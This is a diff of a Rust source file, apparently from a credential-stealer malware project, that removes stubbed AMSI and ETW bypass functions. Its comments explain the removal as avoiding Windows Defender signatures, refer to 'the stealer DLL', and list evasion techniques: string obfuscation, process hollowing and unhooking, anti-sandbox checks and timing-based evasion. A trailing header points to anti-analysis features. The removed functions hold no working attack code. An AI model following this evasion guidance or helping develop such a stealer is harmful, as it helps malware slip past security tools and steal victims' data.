@@ -218,53 +218,6 @@ pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<L
     None
 }
 
-/// AMSI bypass removed - direct patching is heavily signatured by AV
-/// Instead, we rely on:
-/// 1. String obfuscation (obfstr) for API calls
-/// 2. Process hollowing / unhooking techniques
-/// 3. Legitimate Windows APIs that don't trigger AMSI
-/// 4. The stealer DLL itself uses proper evasion techniques
-#[cfg(target_os = "windows")]
-pub unsafe fn bypass_amsi() -> bool {
-    // REMOVED: Direct AMSI patching is detected by Windows Defender as AMSI_Patch_T.B1
-    // Modern approach: Don't patch AMSI at all. Instead:
-    // - Use obfuscated strings throughout the code
-    // - Avoid suspicious memory operations
-    // - Let the payload handle its own evasion
-    // - Use legitimate Windows APIs
-    
-    // Return true to indicate "bypass not needed" rather than "bypass failed"
-    true
-}
-
-#[cfg(not(target_os = "windows"))]
-pub unsafe fn bypass_amsi() -> bool {
-    false
-}
-
-/// ETW bypass - disabled to avoid detection
-/// ETW (Event Tracing for Windows) bypass is also heavily monitored
-/// Modern approach: Accept that ETW will log events, but:
-/// 1. Use legitimate-looking operations
-/// 2. Minimize suspicious behavior
-/// 3. Rely on the overall evasion strategy rather than patching
-#[cfg(target_os = "windows")]
-pub unsafe fn bypass_etw() -> bool {
-    // REMOVED: Direct ETW patching can also trigger detections
-    // Better to accept telemetry and use other evasion techniques:
-    // - String obfuscation throughout the code
-    // - Legitimate Windows API usage
-    // - Anti-sandbox checks (already implemented)
-    // - Timing-based evasion
-    
-    // Return true to indicate "bypass not needed"
-    true
-}
-
-#[cfg(not(target_os = "windows"))]
-pub unsafe fn bypass_etw() -> bool {
-    false
-}
 
 // ============================================================================
 // Anti-Sandbox and Anti-Analysis Features
